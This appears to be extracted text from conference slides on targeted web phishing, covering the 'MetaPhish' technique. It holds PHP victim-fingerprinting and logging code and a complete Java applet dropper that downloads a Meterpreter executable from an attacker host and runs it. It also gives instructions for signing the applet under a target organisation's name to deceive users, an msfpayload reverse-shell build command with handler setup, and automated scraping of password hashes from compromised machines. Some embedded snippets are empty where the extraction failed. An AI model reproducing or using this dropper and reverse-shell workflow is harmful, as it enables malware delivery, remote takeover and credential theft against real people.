Slide: 47
GATHER BROWSER INFO
Slide: 48
Web Phishing ­ Sieve
function browserDetect($useragent) {
        // Check for firefox
        if (preg_match("/Firefox/", $useragent,
$winmatched)) {
                $browsertype = "ff";
        } // end ff check
        // Check for IE
        elseif (preg_match("/MSIE/", 
$useragent,$winmatched)) {
                $browsertype = "ie";
        } // end ie check
        // Check for safari
        elseif (preg_match("/Safari/", 
$useragent,$winmatched)) {
                $browsertype = "safari";
        } // end safari check
 // Check for opera
        elseif 
(preg_match("/Opera/", 
$useragent,$winmatched)) {
                $browsertype = 
"opera";
        } // end opera check
        // Browser Unknown
        else {
                $browsertype = 
"unknown";
        } // end unknown check
        return $browsertype;
} // end browserDetect
Slide: 49
GET TARGET’S INTERAL IP VIA JS
Slide: 50
Web Phishing ­ Sieve
function jsDecloakIP() {
echo '';
echo '';
} // end jsDecloakIP
Slide: 51
GET INTERAL IP VIA JAVA APPLET
Slide: 52
Web Phishing ­ Sieve
function japdip() {
echo '';
echo '';
echo '';
echo '';
} // japdip
Check out: http://www.reglos.de/myaddress/MyAddress.html for info about the 
class file.
Slide: 53
LOG ALL RELEVANT INFORMATION
Slide: 54
Web Phishing ­ Sieve
function logger($target_ip,$dip,$ost,$bt,$sipf,$hitdate) {
        $nl = "\n";
        $delim = "|";
        $data = $target_ip . $delim . $dip . 
   $delim . $ost . $delim .  $bt . $delim . $sipf . $delim . $hitdate . $nl;
        $outFile = "clientlog.txt";
        $fh = fopen($outFile, 'a') or die ("cant open logfile");
        fwrite($fh,$data);
        fclose($fh);
} // end logger
Slide: 55
DEMO
Example Page
Normally you wouldn’t 
display output
Shows all the target 
acquired data
Slide: 56
Web Phishing
Social Engineering
• Java Applet for distributing and executing 
meterpreter
• Client hits page
• Java applet window pops up
• Client hits “Run”
• Applet causes client to 
– (in the background) 
– download meterpreter executable from your site
• Applet executes meterpreter
• Meterpreter sends reverse shell to your server
Slide: 57
Web Phishing – Dropper/Exec
import java.applet.Applet;
import java.io.*;
import java.net.*;
import java.io.IOException;
public class WebDispApp extends Applet {
public WebDispApp()  { }
public void init() { downloadURL(); cmd();
} /* end public void init */
public void downloadURL() {
OutputStream out = null;
URLConnection conn = null;
InputStream  in = null;
try {
     URL url = new 
URL("http://192.168.1.1/data/win/met.exe");
     out = new BufferedOutputStream(
     new FileOutputStream("c:\\met.exe"));
     conn = url.openConnection();
     in = conn.getInputStream();
     byte[] buffer = new byte[1024];
     int numRead;
     long numWritten = 0;
     while ((numRead = in.read(buffer)) != ­1) {
            out.write(buffer, 0, numRead);
            numWritten += numRead;
     } /* end while */
} /* end try */
catch (Exception exception) {
          exception.printStackTrace();
} /* end catch */
finally {
          try {
                    if (in != null) {
                             in.close();
                     } /* end if */
                    if (out != null) {
                            out.close();
                    } /* end if */
           } /* end try */
           catch (IOException ioe) { }
} /* end finally */
} /* end public void downloadURL */
public void cmd() {
            Process process;
            try  {
                       process = 
Runtime.getRuntime().exec("cmd.exe /c c:\\met.exe");
            } /* end try */
           catch(IOException ioexception) { }
} /* end public void cmd */
} /* end public class */
Slide: 58
Web Phishing – Dropper/Exec
• How to make it deadly?
• Use cryptographically signed java applet
– Sign it as your target
– User reads the cert and trusts it (usually)
– So many sites have invalid certs users don’t even 
notice anymore
• Change up filenames / code to reflect targets 
application infrastructure
– If they use wordpress, use wordpress sounding file 
names for example
Slide: 59
Web Phishing – Dropper/Exec
•
Compile the applet: 
–
javac MetaPhish.java
•
Generate a class file: 
–
jar ­cf MetaPhish.jar MetaPhish.class
•
Build a ketystore and set the passwords / organization name: 
–
keytool ­genkey ­alias signFiles ­keystore msfkeystore ­storepass msfstorepass ­dname "cn=The 
Targets Org" ­keypass msfkeypass
•
Sign the files and create a “secured” jar: 
–
jarsigner ­keystore msfkeystore ­storepass msfstorepass ­keypass msfkeypass ­signedjar 
sMetaPhish.jar MetaPhish.jar signFiles
•
Create the certificate: 
–
keytool ­export ­keystore msfkeystore ­storepass msfstorepass ­alias signFiles ­file 
MetaPhishLLC.cer
•
Import the certificate: 
–
keytool ­import ­alias company ­file MetaPhishLLC.cer ­keystore msfkeystore ­storepass 
msfstorepass
Slide: 60
Web Phishing – Dropper/Exec
• You will now have a collection of files:
– MetaPhish.class  * Compiled Java 
– MetaPhish.jar 
* Compressed class
– MetaPhish.java
* Source code
– MetaPhishLLC.cer
* Certificate
– msfkeystore
* Key store
– sMetaPhish.jar
* Signed Jar
– windex.html
* malicious web page
Slide: 61
Web Phishing – Dropper/Exec
• Web code to execute the applet:
• Put this in an IFRAME with valid web site 
to trick the target
Slide: 62
Web Phishing – Dropper/Exec
• Victim receives message 
box
• Digital Signature will 
appear to have the 
“trusted” information
• Many users will run this
• Basically Social 
Engineering / Targeted 
Phishing
Slide: 63
Automation
Slide: 64
MSF Multi­Handler / Automation
• Need to be able to handle n incoming 
sessions
• Need to be able to automate functions
– Acquire passwords
– Add users
– Upload 2nd stage persistence backdoor
– Registry / stored info
• Need to use firewall allowed egress ports
Slide: 65
MSF Multi­Handler / Automation
• Create a stand alone meterpreter binary for 
windows:
– Use the reverse connection assuming there is a 
firewall
– Set your IP, should be directly internet accessible
– Set the port to receive incoming sessions, directly 
internet accessible
– Set the output name of the executable, for covertness 
set something targeted
• ./msfpayload windows/meterpreter/reverse_tcp 
LHOST=192.168.0.34 LPORT=8000 R | 
./msfencode -b '' -t exe -o meterpreter.exe
Slide: 66
MSF Multi­Handler / Automation
• Run metasploit ./msfconsole
• Set MSF parameters to match the meterp
– msf > use exploit/multi/handler
– msf exploit(handler) > set 
ExitOnSession false
– msf exploit(handler) > set PAYLOAD 
windows/meterpreter/reverse_tcp
– msf exploit(handler) > set LHOST 
192.168.0.34
– msf exploit(handler) > set LPORT 8000
Slide: 67
MSF Multi­Handler / Automation
• Setup automation script and set MSF in 
multihandling mode
– msf exploit(handler) > set 
AutoRunScript ./PhishScrape.rb
– msf exploit(handler) > exploit –j
• You can use any script you want, we are 
providing an example
Slide: 68
MSF Multi­Handler / Automation
• Deploy the meterpreter to your target using 
whatever means
– Infected PDF / files
– Malicious website
• Exploit
• Java Applet
– Exploits
– Email it directly
Slide: 69
MSF Multi­Handler / Automation
• Watch for:
– [*] Transmitting intermediate stager 
for over-sized stage...(191 bytes)
• You have successfully compromised a 
target!
– Many targets may come in at once
– To list your sessions do:
• sessions –l
• Then you can use standard meterpreter 
commands
Slide: 70
MSF Multi­Handler / Automation
• An automated scrapper will run on 
each target 
• Will gather info automatically and 
place it in ~/.msf3/logs/scraper
• Each compromised target will 
generate a dir
–ipaddress_data_timestamp
Slide: 71
MSF Multi­Handler / Automation
• The following information will be autoscraped:
– env.txt
# System environment
– group.txt
# Domain group info
– hashes.txt # Crackable password hashes
– localgroup.txt
# local group memberships
– nethood.txt
# network neighborhood info
– network.txt
# detail networking info of target
– services.txt
# running services (look for AV)
– shares.txt # Any shared directories
– system.txt # operating system info
– users.txt
# local user account names
• Take a look at DarkOperator’s scripts for more ideas: 
http://www.darkoperator.com/ 
Slide: 72
Metaphish
• Demo
Slide: 73
Slide: 74
Who do you want to be today?
Abusing Tor